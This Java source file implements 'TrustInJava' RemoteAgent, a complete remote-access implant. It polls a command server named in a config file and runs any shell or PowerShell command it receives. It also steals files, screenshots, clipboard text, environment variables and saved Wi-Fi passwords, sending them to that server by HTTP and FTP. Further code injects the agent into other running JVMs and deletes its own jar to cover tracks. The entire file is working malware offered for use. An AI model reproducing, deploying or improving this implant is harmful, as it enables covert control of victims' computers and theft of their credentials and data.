package com.trustinjava.agent;

import com.sun.tools.attach.AttachNotSupportedException;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import java.awt.AWTException;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.Rectangle;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Collectors;
import javax.imageio.ImageIO;
import javax.swing.filechooser.FileSystemView;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;
import org.apache.commons.net.ftp.FTPReply;

public class RemoteAgent {
  public static Socket socket = null;
  public static DataOutputStream out = null;
  public static String request_craft = "";
  public static String AgentUN = "Agent";
  public static Boolean custom_cmd = Boolean.valueOf(false);
  public static Boolean Stage2 = Boolean.valueOf(false);
  public static String host = "";
  public static int port;

  public static void deleteJarOnExitLinux() throws IOException {
    String jarPath = (new File(RemoteAgent.class.getProtectionDomain().getCodeSource().getLocation().getPath())).getAbsolutePath();
    String[] cmd = { "/bin/sh", "-c", "sleep 3 && rm -f \"" + jarPath + "\"" };
    Runtime.getRuntime().exec(cmd);
    System.exit(0);
  }

  public static void deleteJarOnExitWindows() throws IOException {
    String jarPath = (new File(RemoteAgent.class.getProtectionDomain().getCodeSource().getLocation().getPath())).getAbsolutePath();
    String command = "cmd /c ping 127.0.0.1 -n 3 > nul && del \"" + jarPath + "\"";
    Runtime.getRuntime().exec(command);
    System.exit(0);
  }

  public static String listProcesses() {
    try {
      String os = System.getProperty("os.name").toLowerCase();
      Process process;

      if (os.contains("win")) {
        process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "tasklist /v /fo csv"});
      } else {
        process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "ps aux"});
      }

      BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      StringBuilder output = new StringBuilder();
      String line;

      while ((line = reader.readLine()) != null) {
        output.append(line).append("\n");
      }

      process.waitFor();
      reader.close();

      return output.toString();
    } catch (Exception e) {
      return "[Error listing processes: " + e.getMessage() + "]";
    }
  }

  public static String getSystemInfo() {
    StringBuilder sendResults = new StringBuilder();
    sendResults.append("[*] System info requested:\n");
    sendResults.append("Operating system architecture: ").append(System.getProperty("os.arch")).append("\n");
    sendResults.append("Operating system name: ").append(System.getProperty("os.name")).append("\n");
    sendResults.append("Operating system version: ").append(System.getProperty("os.version")).append("\n");
    sendResults.append("User working directory: ").append(System.getProperty("user.dir")).append("\n");
    sendResults.append("User home directory: ").append(System.getProperty("user.home")).append("\n");
    sendResults.append("User account name: ").append(System.getProperty("user.name")).append("\n");
    sendResults.append("File separator: ").append(System.getProperty("file.separator")).append("\n");
    sendResults.append("Java class path: ").append(System.getProperty("java.class.path")).append("\n");
    sendResults.append("JRE installation directory: ").append(System.getProperty("java.home")).append("\n");
    sendResults.append("JRE vendor name: ").append(System.getProperty("java.vendor")).append("\n");
    sendResults.append("JRE vendor URL: ").append(System.getProperty("java.vendor.url")).append("\n");
    sendResults.append("JRE version number: ").append(System.getProperty("java.version")).append("\n");
    sendResults.append("Line separator: ").append(System.getProperty("line.separator")).append("\n");
    sendResults.append("Current JVM: ").append(ManagementFactory.getRuntimeMXBean().getName()).append("\n");
    return sendResults.toString();
  }

  public static String getRunningJVMPIDs() {
    List<VirtualMachineDescriptor> vms = VirtualMachine.list();
    return vms.stream()
      .map(vm -> "PID: " + vm.id() + " - " + vm.displayName())
      .collect(Collectors.joining("\n"));
  }

  public static String getCurrentJarPath() {
    try {
      return (new File(RemoteAgent.class
          .getProtectionDomain()
          .getCodeSource()
          .getLocation()
          .toURI()))
        .getAbsolutePath();
    } catch (Exception e) {
      return "unknown";
    }
  }

  public static String getCurrentJVMInfo() {
    String jvmName = ManagementFactory.getRuntimeMXBean().getName();
    String pid = jvmName.split("@")[0];
    String mainClass = System.getProperty("sun.java.command", "Unknown");
    return "PID: " + pid + ", Main Class: " + mainClass;
  }

  private static String truncate(String s, int maxBytes) {
    if (s == null) return "";
    if (s.getBytes(java.nio.charset.StandardCharsets.UTF_8).length <= maxBytes) return s;
    int end = Math.min(s.length(), maxBytes * 3 / 4);
    while (s.substring(0, end).getBytes(java.nio.charset.StandardCharsets.UTF_8).length > maxBytes) {
      end -= 100;
    }
    return s.substring(0, end) + "\n...[OUTPUT TRUNCATED - " + s.length() + " chars total]";
  }

  public static String getClipboard() {
    try {
      Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();
      Transferable contents = cb.getContents(null);
      if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {
        String text = (String) contents.getTransferData(DataFlavor.stringFlavor);
        return "[*] Clipboard contents:\n" + text;
      }
      return "[*] Clipboard: empty or non-text content";
    } catch (Exception e) {
      return "[!] Clipboard error: " + e.getMessage();
    }
  }

  public static String getEnvVars() {
    StringBuilder sb = new StringBuilder("[*] Environment Variables:\n");
    for (java.util.Map.Entry<String, String> entry : System.getenv().entrySet()) {
      sb.append(entry.getKey()).append("=").append(entry.getValue()).append("\n");
    }
    return sb.toString();
  }

  public static String getNetConnections() {
    String os = System.getProperty("os.name").toLowerCase();
    if (os.contains("win")) {
      try {
        Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "netstat -ano"});
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder("[*] Network Connections:\n");
        String line;
        while ((line = r.readLine()) != null) sb.append(line).append("\n");
        p.waitFor();
        r.close();
        return sb.toString();
      } catch (Exception e) {
        return "[!] netconn error: " + e.getMessage();
      }
    } else {
      try {
        String[] stateMap = {"", "ESTABLISHED", "SYN_SENT", "SYN_RECV", "FIN_WAIT1",
            "FIN_WAIT2", "TIME_WAIT", "CLOSE", "CLOSE_WAIT", "LAST_ACK", "LISTEN", "CLOSING"};
        StringBuilder sb = new StringBuilder("[*] Network Connections (TCP):\n");
        sb.append(String.format("%-26s %-26s %-14s %s\n",
            "Local Address", "Remote Address", "State", "UID"));
        for (String fname : new String[]{"/proc/net/tcp", "/proc/net/tcp6"}) {
          File f = new File(fname);
          if (!f.exists()) continue;
          List<String> lines = Files.readAllLines(f.toPath());
          for (int i = 1; i < lines.size(); i++) {
            String[] parts = lines.get(i).trim().split("\\s+");
            if (parts.length < 8) continue;
            int stateInt = Integer.parseInt(parts[3], 16);
            String state = (stateInt < stateMap.length) ? stateMap[stateInt] : "UNKNOWN";
            String uid = parts[7];
            sb.append(String.format("%-26s %-26s %-14s %s\n",
                hexToAddr(parts[1]), hexToAddr(parts[2]), state, uid));
          }
        }
        return sb.toString();
      } catch (Exception e) {
        return "[!] netconn error: " + e.getMessage();
      }
    }
  }

  private static String hexToAddr(String hexStr) {
    try {
      String[] parts = hexStr.split(":");
      long ipLong = Long.parseLong(parts[0], 16);
      int port = Integer.parseInt(parts[1], 16);
      String ip = (ipLong & 0xFF) + "." + ((ipLong >> 8) & 0xFF) + "."
          + ((ipLong >> 16) & 0xFF) + "." + ((ipLong >> 24) & 0xFF);
      return ip + ":" + port;
    } catch (Exception e) {
      return hexStr;
    }
  }

  public static String getArpTable() {
    String os = System.getProperty("os.name").toLowerCase();
    if (os.contains("win")) {
      try {
        Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "arp -a"});
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder("[*] ARP Table:\n");
        String line;
        while ((line = r.readLine()) != null) sb.append(line).append("\n");
        p.waitFor();
        r.close();
        return sb.toString();
      } catch (Exception e) {
        return "[!] arp error: " + e.getMessage();
      }
    } else {
      try {
        File f = new File("/proc/net/arp");
        if (f.exists()) {
          StringBuilder sb = new StringBuilder("[*] ARP Table:\n");
          Files.readAllLines(f.toPath()).forEach(l -> sb.append(l).append("\n"));
          return sb.toString();
        }
        return "[!] /proc/net/arp not accessible";
      } catch (Exception e) {
        return "[!] arp error: " + e.getMessage();
      }
    }
  }

  public static String getWifiProfiles() {
    String os = System.getProperty("os.name").toLowerCase();
    if (os.contains("win")) {
      try {
        Process p = Runtime.getRuntime().exec(
            new String[]{"cmd.exe", "/c", "netsh wlan show profiles"});
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder("[*] WiFi Profiles:\n");
        java.util.List<String> profileNames = new java.util.ArrayList<>();
        String line;
        while ((line = r.readLine()) != null) {
          sb.append(line).append("\n");
          if (line.contains(":") && (line.contains("All User Profile") || line.contains("Perfil"))) {
            String name = line.substring(line.lastIndexOf(":") + 1).trim();
            if (!name.isEmpty()) profileNames.add(name);
          }
        }
        p.waitFor();
        r.close();
        sb.append("\n[*] WiFi Keys:\n");
        for (String profileName : profileNames) {
          try {
            Process pk = Runtime.getRuntime().exec(
                new String[]{"cmd.exe", "/c",
                    "netsh wlan show profile name=\"" + profileName + "\" key=clear"});
            BufferedReader rk = new BufferedReader(new InputStreamReader(pk.getInputStream()));
            String lk;
            while ((lk = rk.readLine()) != null) {
              if (lk.contains("Key Content") || lk.contains("Contenido de la clave")) {
                sb.append("  [").append(profileName).append("] ").append(lk.trim()).append("\n");
              }
            }
            pk.waitFor();
            rk.close();
          } catch (Exception ignored) {}
        }
        return sb.toString();
      } catch (Exception e) {
        return "[!] wifi error: " + e.getMessage();
      }
    } else {
      try {
        StringBuilder sb = new StringBuilder("[*] WiFi Profiles (NetworkManager):\n");
        File nmDir = new File("/etc/NetworkManager/system-connections/");
        if (nmDir.exists() && nmDir.isDirectory()) {
          File[] files = nmDir.listFiles();
          if (files != null) {
            for (File f : files) {
              sb.append("\n--- Profile: ").append(f.getName()).append(" ---\n");
              try {
                Files.readAllLines(f.toPath()).forEach(l -> sb.append(l).append("\n"));
              } catch (Exception ex) {
                sb.append("  [Access denied - try as root]\n");
              }
            }
          } else {
            sb.append("[No profiles found]\n");
          }
        } else {
          sb.append("[NetworkManager profiles dir not found. Trying nmcli...]\n");
          Process p = Runtime.getRuntime().exec(
              new String[]{"/bin/sh", "-c", "nmcli -s -g NAME,TYPE,DEVICE,CONNECTION-TYPE connection show"});
          BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
          String line;
          while ((line = r.readLine()) != null) sb.append(line).append("\n");
          p.waitFor();
          r.close();
        }
        return sb.toString();
      } catch (Exception e) {
        return "[!] wifi error: " + e.getMessage();
      }
    }
  }

  public static void agentmain(String args, Instrumentation inst) {
    try {
      sendResults(host, port, "[*] Agent injected into target process.");
      Looper();
    } catch (InterruptedException|IOException ex) {
      Logger.getLogger(RemoteAgent.class.getName()).log(Level.SEVERE, null, ex);
    }
  }

  public static void sendMagic(String host, int port) throws InterruptedException, IOException, AWTException {
    socket = new Socket(host, port);

    String request = getCookieID() + "&" + getCookieID() + "&Java Agent&" + getLocalIPAddress() + "&Waiting for commands&1&" + getOSFriendlyName() + "&" + AgentUN;
    String encoded_request = Base64.getEncoder().encodeToString(request.getBytes());
    request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";

    out = new DataOutputStream(socket.getOutputStream());

    String line = "";
    line = request_craft;
    out.write(line.getBytes("UTF-8"));
    out.flush();

    InputStream input = socket.getInputStream();
    InputStreamReader reader = new InputStreamReader(input);

    StringBuilder data = new StringBuilder();
    String exec = "";
    int character;
    while ((character = reader.read()) != -1) {
      data.append((char)character);
    }

    if (data.toString().contains("OS=")) {
      exec = getTextBetween(data.toString(), "OS=", "*_*");

      if (exec.equals("exit")) {
        custom_cmd = Boolean.valueOf(true);
        String sendResults = "Session terminated.";
        sendResults(host, port, sendResults);
        System.exit(0);
      }

      if (exec.equals("killagent")) {
        custom_cmd = Boolean.valueOf(true);
        String sendResults = "Session terminated.";
        sendResults(host, port, sendResults);
        System.exit(0);
        if (isWin().booleanValue()) {
          deleteJarOnExitWindows();
        } else {
          deleteJarOnExitLinux();
        }
      }

      if (exec.equals("drives")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          FileSystemView fsv = FileSystemView.getFileSystemView();
          File[] paths = File.listRoots();
          for (File path : paths) {
            String sendResults = "Drive Name: " + String.valueOf(path) + "\nDescription: " + fsv.getSystemTypeDescription(path);
            sendResults(host, port, sendResults);
          }
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("getuid")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          String sendResults = System.getProperty("user.name");
          sendResults(host, port, sendResults);
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.contains("download_file")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          String[] args = exec.split("\\s+");
          InputStream is = null;
          OutputStream os = null;
          try {
            is = new FileInputStream(args[1]);
            os = new FileOutputStream("file_from_target");
            byte[] buffer = new byte[1024];
            int length;
            while ((length = is.read(buffer)) > 0) {
              os.write(buffer, 0, length);
            }
          } finally {
            is.close();
            os.close();
          }

          File upload_file = new File(args[1]);
          InputStream inputStream = new FileInputStream(upload_file);
          uploadFile(host, 2121, "anonymous", "anonymous", Paths.get(".", new String[0]).toAbsolutePath().normalize().toString(), upload_file.getName(), inputStream);
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.contains("upload_file")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          String[] args = exec.split("\\s+");
          downFile(host, 2121, "anonymous", "anonymous", Paths.get(".", new String[0]).toAbsolutePath().normalize().toString(), args[1], args[1]);
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("screenshot")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          try {
            String timestamp = String.valueOf(System.currentTimeMillis());
            String filename = "screenshot_" + timestamp + ".png";

            BufferedImage image = (new Robot()).createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ImageIO.write(image, "png", new File(filename));

            File upload_file = new File(filename);
            InputStream inputStream = new FileInputStream(upload_file);
            boolean uploaded = uploadFile(host, 2121, "anonymous", "anonymous", Paths.get(".", new String[0]).toAbsolutePath().normalize().toString(), filename, inputStream);

            if (uploaded) {
              sendResults(host, port, "[+] Screenshot captured and uploaded successfully: " + filename);
            } else {
              sendResults(host, port, "[!] Screenshot captured but upload failed");
            }

            upload_file.delete();
          } catch (Exception e) {
            sendResults(host, port, "[!] Screenshot error: " + e.getMessage());
          }
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("escalate")) {
        custom_cmd = Boolean.valueOf(true);
        Stage2 = Boolean.valueOf(true);
        AgentUN = "Aggressive";
        sendResults(host, port, "Aggressive mode activated");
      }

      if (exec.equals("systeminfo")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, "\n" + getSystemInfo());
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("currentpath")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          String currentPath = (new File(".")).getCanonicalPath();
          String sendResults = "Current Path: " + currentPath;
          sendResults(host, port, sendResults);
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("listproc")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, "\n" + listProcesses());
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("listJVMs")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, "\n" + getRunningJVMPIDs());
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("currentJVM")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, "\n" + getCurrentJVMInfo());
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.contains("attachJVM")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          try {
            String[] input_cmd = exec.split("\\s+");
            sendResults(host, port, "[*] Trying to load agent from: " + getCurrentJarPath());
            VirtualMachine vm = VirtualMachine.attach(input_cmd[1]);
            vm.loadAgent(getCurrentJarPath());
            vm.detach();
          } catch (AttachNotSupportedException|com.sun.tools.attach.AgentLoadException|com.sun.tools.attach.AgentInitializationException ex) {
            Logger.getLogger(RemoteAgent.class.getName()).log(Level.SEVERE, null, ex);
          }
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      final int MAX_OUT = 30_000;

      if (exec.equals("clipboard")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, truncate(getClipboard(), MAX_OUT));
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("envvars")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, truncate(getEnvVars(), MAX_OUT));
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("netconn")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, truncate(getNetConnections(), MAX_OUT));
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("arp")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, truncate(getArpTable(), MAX_OUT));
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      if (exec.equals("wifi_profiles")) {
        custom_cmd = Boolean.valueOf(true);
        if (Stage2.booleanValue()) {
          sendResults(host, port, truncate(getWifiProfiles(), MAX_OUT));
        } else {
          sendResults(host, port, "Please escalate to Aggressive mode first.");
        }
      }

      TimeUnit.SECONDS.sleep(2L);

      String sendCmdOut = "";
      if (!custom_cmd.booleanValue() && !exec.equals("")) {
        sendCmdOut = execCmd(exec);
        sendResults(host, port, sendCmdOut);
      }
      custom_cmd = Boolean.valueOf(false);
    }

    out.close();
    socket.close();
  }

  public static String getTextBetween(String wholeString, String str1, String str2) {
    String s = wholeString.substring(wholeString.indexOf(str1) + str1.length());
    s = s.substring(0, s.indexOf(str2));
    return s;
  }

  public static void sendResults(String host, int port, String dataToSend) throws InterruptedException, IOException {
    try {
      socket = new Socket(host, port);

      String request = getCookieID() + "&" + getCookieID() + "&Java Agent&" + getLocalIPAddress() + "&" + getOSFriendlyName() + "&1&" + dataToSend + "&" + AgentUN;
      String encoded_request = Base64.getEncoder().encodeToString(request.getBytes());
      request_craft = "GET /agent/&" + encoded_request + " HTTP/1.1\r\nHost:" + host + "\r\nConnection: close\r\n\r\n";

      out = new DataOutputStream(socket.getOutputStream());
    } catch (UnknownHostException u) {
      System.out.println(u);
      return;
    } catch (IOException i) {
      System.out.println(i);
      return;
    }

    String line = "";

    try {
      line = request_craft;
      out.write(line.getBytes("UTF-8"));
      out.flush();
    } catch (IOException i) {
      System.out.println(i);
    }

    InputStream input = socket.getInputStream();
    InputStreamReader reader = new InputStreamReader(input);

    StringBuilder data = new StringBuilder();
    int character;
    while ((character = reader.read()) != -1) {
      data.append((char)character);
    }

    try {
      out.close();
      socket.close();
    } catch (IOException i) {
      System.out.println(i);
    }
  }

  public static void Looper() {
    try {
      String currentPath = (new File(".")).getCanonicalPath();
      System.out.println("[*] Agent path:" + currentPath);

      Path filePath = (new File("config.ep")).toPath();
      Charset charset = Charset.defaultCharset();
      List<String> stringList = Files.readAllLines(filePath, charset);
      final String[] stringArray = stringList.<String>toArray(new String[0]);
      host = stringArray[0];
      port = Integer.parseInt(stringArray[1]);

      sendResults(stringArray[0], Integer.parseInt(stringArray[1]), "\n" + getSystemInfo());
      Thread runnerMagic = new Thread(new Runnable() {
        public void run() {
          while (true) {
            try {
              TimeUnit.SECONDS.sleep(4L);
              RemoteAgent.sendMagic(stringArray[0], Integer.parseInt(stringArray[1]));
            } catch (InterruptedException|IOException|AWTException ex) {
              Logger.getLogger(RemoteAgent.class.getName()).log(Level.SEVERE, null, ex);
            }
          }
        }
      });
      runnerMagic.start();
      runnerMagic.join();
    } catch (InterruptedException|IOException ex) {
      Logger.getLogger(RemoteAgent.class.getName()).log(Level.SEVERE, null, ex);
    }
  }

  public static void main(String[] args) throws InterruptedException, IOException {
    System.out.println("[*] Starting TrustInJava Agent - Multiplatform: Win/Linux/Mac");
    Looper();
  }

  public static String execCmd(String cmd) {
    String result = null;
    try {
      Process process;

      String os = System.getProperty("os.name").toLowerCase();

      if (os.contains("win")) {
        if (cmd.toLowerCase().startsWith("ps ")) {
          String psCmd = cmd.substring(3);
          process = Runtime.getRuntime().exec(new String[]{"powershell.exe", "-Command", psCmd});
        } else {
          process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
        }
      } else {
        process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
      }

      InputStream inputStream = process.getInputStream();
      InputStream errorStream = process.getErrorStream();

      try {
        Scanner s = new Scanner(inputStream).useDelimiter("\\A");
        Scanner e = new Scanner(errorStream).useDelimiter("\\A");

        try {
          String output = s.hasNext() ? s.next() : "";
          String errors = e.hasNext() ? e.next() : "";

          result = output;
          if (!errors.isEmpty()) {
            result = result + "\n[STDERR]:\n" + errors;
          }

          if (result.isEmpty()) {
            result = "[No output]";
          }

          if (s != null) s.close();
          if (e != null) e.close();
        } catch (Throwable throwable) {
          if (s != null) try { s.close(); } catch (Throwable throwable1) { throwable.addSuppressed(throwable1); }
          if (e != null) try { e.close(); } catch (Throwable throwable1) { throwable.addSuppressed(throwable1); }
          throw throwable;
        }

        if (inputStream != null) inputStream.close();
        if (errorStream != null) errorStream.close();
      } catch (Throwable throwable) {
        if (inputStream != null) try { inputStream.close(); } catch (Throwable throwable1) { throwable.addSuppressed(throwable1); }
        if (errorStream != null) try { errorStream.close(); } catch (Throwable throwable1) { throwable.addSuppressed(throwable1); }
        throw throwable;
      }

      process.waitFor();

    } catch (Exception e) {
      result = "[Error executing command]: " + e.getMessage();
    }

    return result;
  }

  private static Boolean isWin() {
    String os = System.getProperty("os.name").toLowerCase();
    Boolean is_win = Boolean.valueOf(true);
    if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
      is_win = Boolean.valueOf(false);
    }
    return is_win;
  }

  private static String getComputerName() throws IOException {
    String os = System.getProperty("os.name").toLowerCase();
    String os_name = "not_identified";
    if (os.contains("win")) {
      os_name = execReadToString("hostname");
    } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
      os_name = execReadToString("hostname");
    }
    return os_name.strip();
  }

  private static String getOSFriendlyName() throws IOException {
    return System.getProperty("os.name");
  }

  private static String getCookieID() throws IOException {
    return Base64.getEncoder().encodeToString(getComputerName().getBytes());
  }

  public static String execReadToString(String execCommand) throws IOException {
    Scanner s = (new Scanner(Runtime.getRuntime().exec(execCommand).getInputStream())).useDelimiter("\\A");
    try {
      String str = s.hasNext() ? s.next() : "";
      if (s != null) s.close();
      return str;
    } catch (Throwable throwable) {
      if (s != null) try { s.close(); } catch (Throwable throwable1) { throwable.addSuppressed(throwable1); }
      throw throwable;
    }
  }

  private static String getLocalIPAddress() throws UnknownHostException, SocketException {
    DatagramSocket socket = new DatagramSocket();
    try {
      socket.connect(InetAddress.getByName("8.8.8.8"), 10002);
      String str = socket.getLocalAddress().getHostAddress();
      socket.close();
      return str;
    } catch (Throwable throwable) {
      try { socket.close(); } catch (Throwable throwable1) { throwable.addSuppressed(throwable1); }
      throw throwable;
    }
  }

  public static boolean uploadFile(String url, int port, String username, String password, String path, String filename, InputStream input) {
    boolean success = false;
    FTPClient ftp = new FTPClient();

    try {
      ftp.setConnectTimeout(5000);
      ftp.connect(url, port);

      if (!FTPReply.isPositiveCompletion(ftp.getReplyCode())) {
        ftp.disconnect();
        return false;
      }
      ftp.enterLocalPassiveMode();

      ftp.setSoTimeout(5000);
      ftp.setControlKeepAliveTimeout(1L);
      ftp.setControlKeepAliveReplyTimeout(5000);

      boolean login_ok = ftp.login(username, password);
      if (!login_ok) {
        ftp.disconnect();
        return false;
      }

      ftp.setFileType(2);

      if (filename.contains("screenshot")) {
        ftp.makeDirectory("screenshots");
        ftp.changeWorkingDirectory("screenshots");
      }

      boolean uploaded = ftp.storeFile(filename, input);

      input.close();
      ftp.logout();
      success = uploaded;
    } catch (IOException e) {
      e.printStackTrace();
    } finally {
      if (ftp.isConnected()) {
        try {
          ftp.disconnect();
        } catch (IOException iOException) {}
      }
    }

    return success;
  }

  public static boolean downFile(String url, int port, String username, String password, String remotePath, String fileName, String localPath) {
    boolean success = false;
    FTPClient ftp = new FTPClient();

    try {
      ftp.connect(url, port);
      ftp.login(username, password);
      int reply = ftp.getReplyCode();
      if (!FTPReply.isPositiveCompletion(reply)) {
        ftp.disconnect();
        return success;
      }
      ftp.changeWorkingDirectory(remotePath);
      FTPFile[] fs = ftp.listFiles();
      for (FTPFile ff : fs) {
        if (ff.getName().equals(fileName)) {
          File localFile = new File(localPath + "/" + localPath);
          OutputStream is = new FileOutputStream(localFile);
          ftp.retrieveFile(ff.getName(), is);
          is.close();
        }
      }

      ftp.logout();
      success = true;
    } catch (IOException e) {
      e.printStackTrace();
    } finally {
      if (ftp.isConnected()) {
        try {
          ftp.disconnect();
        } catch (IOException iOException) {}
      }
    }

    return success;
  }
}
